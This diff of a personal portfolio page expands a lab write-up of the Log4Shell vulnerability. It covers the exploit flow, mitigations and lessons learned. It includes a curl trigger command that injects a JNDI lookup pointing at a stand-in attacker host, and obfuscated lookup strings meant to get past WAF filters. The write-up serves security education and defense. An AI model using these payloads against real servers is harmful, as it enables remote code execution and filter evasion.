@@ -41,35 +41,136 @@
         <section class="project-content container">
             <div class="project-overview">
                 <h2>Project Overview</h2>
-                <p>Recreated the CVE-2021-44228 "Log4Shell" vulnerability in a controlled environment to observe the full remote code execution chain. The study examined how JNDI lookups in Log4j enable attackers to trigger outbound connections and run arbitrary classes.</p>
+                <p>Recreated the CVE‑2021‑44228 <strong>Log4Shell</strong> vulnerability in a controlled lab to observe the entire remote code execution chain and evaluate realistic defenses.</p>
+            </div>
+
+            <div class="project-background">
+                <h2>Vulnerability Background</h2>
+                <p>Log4Shell stems from Log4j&rsquo;s message lookup substitution. Malicious input such as <code>${jndi:ldap://attacker/Exploit}</code> causes a JNDI lookup that can load remote bytecode.</p>
+                <pre class="mermaid">
+timeline
+    title Log4Shell Key Events
+    2021-11 : Vulnerable releases begin
+    2021-12-09 : CVE-2021-44228 disclosed
+    2021-12-10 : 2.15.0 initial patch
+    2021-12-13 : 2.16.0 disables JNDI
+    2021-12-17 : 2.17.0 hardens lookup behavior
+                </pre>
             </div>
 
             <div class="project-environment">
                 <h2>Environment &amp; Tools</h2>
                 <ul>
-                    <li>Vulnerable Java application using Log4j 2.14.1</li>
-                    <li>Marshalsec LDAP server and Python HTTP server for payload delivery</li>
-                    <li>curl and custom scripts to inject <code>${jndi:}</code> payloads</li>
-                    <li>Wireshark and log monitoring to validate exploit execution</li>
+                    <li>Vulnerable Java web app using Log4j&nbsp;2.14.1 on Java&nbsp;8</li>
+                    <li>Marshalsec LDAP server redirecting to a Python HTTP payload host</li>
+                    <li>curl/Python scripts injecting <code>${jndi:}</code> into headers, fields, and filenames</li>
+                    <li>tcpdump/Wireshark and application logs for network and lookup monitoring</li>
+                </ul>
+                <pre class="mermaid">
+graph LR
+    A((Attacker)) -->|${jndi:}| B[Vulnerable App]
+    B -->|LDAP query| C[Marshalsec]
+    C -->|HTTP redirect| D[Payload Server]
+    D --> B
+                </pre>
+            </div>
+
+            <div class="project-exploit">
+                <h2>Exploit Flow</h2>
+                <ol>
+                    <li>Attacker injects a lookup string into data that the application logs.</li>
+                    <li>Log4j resolves <code>${jndi:ldap://...}</code> and performs an outbound LDAP query.</li>
+                    <li>LDAP server responds with a reference to <code>ExploitPayload.class</code>.</li>
+                    <li>The application fetches the class over HTTP and loads it into memory.</li>
+                    <li>The payload executes with the application&rsquo;s privileges.</li>
+                </ol>
+                <pre class="mermaid">
+sequenceDiagram
+    participant Attacker
+    participant Server
+    participant LDAP
+    participant HTTP
+    Attacker->>Server: ${jndi:ldap://LDAP/Exploit}
+    Server->>LDAP: Lookup
+    LDAP-->>Server: Reference http://HTTP/ExploitPayload.class
+    Server->>HTTP: Fetch class
+    Server-->>Server: Run payload
+                </pre>
+            </div>
+
+            <div class="project-evasion">
+                <h2>Detection Evasion Techniques</h2>
+                <ul>
+                    <li>Lookup composition: <code>${lower:j}${lower:n}${lower:d}${lower:i}</code> and <code>${::-l}${::-d}${::-a}${::-p}</code></li>
+                    <li>URL/Unicode encoding of <code>${</code> and protocol delimiters</li>
+                    <li>Fallback insertion via <code>${env:NOTEXIST:-h}</code> to construct payload strings</li>
+                    <li>Alternate schemas such as <code>rmi://</code> or <code>dns://</code> to dodge LDAP‑only filters</li>
+                </ul>
+                <pre class="mermaid">
+flowchart LR
+    P[Malicious Input] --> F{WAF Filter}
+    F -->|Literal match| B[Blocked]
+    F -->|Obfuscated payload| E[Bypassed]
+    E --> L[Logged by App]
+    L --> R[JNDI Resolution]
+                </pre>
+            </div>
+
+            <div class="project-poc">
+                <h2>Proof-of-Concept Infrastructure</h2>
+                <ul>
+                    <li>Marshalsec listening on port 1389 serving LDAP references</li>
+                    <li>Python HTTP server hosting <code>ExploitPayload.class</code></li>
+                    <li>Trigger command: <code>curl -H 'User-Agent: ${jndi:ldap://attacker:1389/Exploit}' http://victim/login</code></li>
+                    <li>Observed LDAP and HTTP callbacks followed by payload execution on the victim</li>
                 </ul>
             </div>
 
-            <div class="project-findings">
-                <h2>Key Experiments</h2>
+            <div class="project-scenarios">
+                <h2>Attack Scenarios &amp; Observations</h2>
                 <ul>
-                    <li>Demonstrated end-to-end exploitation from log injection to remote class loading.</li>
-                    <li>Crafted obfuscated payloads using lookup functions and encoding to bypass simple filters.</li>
-                    <li>Evaluated mitigations such as patched Log4j versions, <code>formatMsgNoLookups</code>, and network egress controls.</li>
+                    <li>Injection via usernames, HTTP headers, and file names all triggered lookups.</li>
+                    <li>Outbound firewall rules broke the exploit chain despite successful logging.</li>
+                    <li>Mock WAF blocked plain payloads but not obfuscated variants.</li>
                 </ul>
+            </div>
+
+            <div class="project-mitigation">
+                <h2>Mitigation Strategies</h2>
+                <ul>
+                    <li>Upgrade to Log4j&nbsp;2.17.x or remove the <code>JndiLookup</code> class.</li>
+                    <li>Set <code>log4j2.formatMsgNoLookups=true</code> or use <code>%m{nolookups}</code> in patterns.</li>
+                    <li>Restrict outbound LDAP/RMI/HTTP traffic from servers.</li>
+                    <li>Deploy WAF rules that resolve lookups before pattern matching.</li>
+                    <li>Monitor logs, DNS callbacks, and spawned processes for exploitation signs.</li>
+                </ul>
+                <pre class="mermaid">
+graph TD
+    Patch[Patch Log4j] --> Config[Disable Lookups]
+    Config --> Egress[Restrict Egress]
+    Egress --> Monitor[Monitor Activity]
+    Monitor --> Defense[Defense in Depth]
+                </pre>
             </div>
 
             <div class="project-lessons">
                 <h2>Lessons Learned</h2>
                 <ul>
-                    <li>Logging features can become critical attack surfaces when misconfigured.</li>
-                    <li>Effective detection must normalize Log4j lookups to defeat evasion tricks.</li>
+                    <li>Logging frameworks become RCE vectors when untrusted data is evaluated.</li>
+                    <li>Normalization of lookup expressions is mandatory for reliable detection.</li>
                     <li>Layered defenses—patching, configuration hardening, and outbound filtering—provide the strongest protection.</li>
                 </ul>
+            </div>
+
+            <div class="project-report">
+                <h2>Research Report Outline</h2>
+                <ol>
+                    <li>Abstract &amp; Introduction</li>
+                    <li>Background &amp; Related Work</li>
+                    <li>Methodology &amp; Environment Setup</li>
+                    <li>Experiments, Evasion, and Results</li>
+                    <li>Discussion, Mitigation, and Conclusion</li>
+                </ol>
             </div>
         </section>
     </main>
@@ -79,5 +180,9 @@
             <p>&copy; 2025 Mason Kim. All rights reserved.</p>
         </div>
     </footer>
+    <script type="module">
+        import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+        mermaid.initialize({ startOnLoad: true });
+    </script>
 </body>
 </html>
